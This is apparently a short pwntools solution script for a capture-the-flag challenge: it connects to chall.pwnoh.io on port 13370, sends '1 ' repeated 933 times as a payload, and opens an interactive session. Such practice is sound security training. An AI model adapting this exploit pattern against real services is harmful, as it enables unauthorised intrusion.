from pwn import *

r = remote("chall.pwnoh.io",13370)

payload = b"1 " * 933
r.sendline(payload)

r.interactive()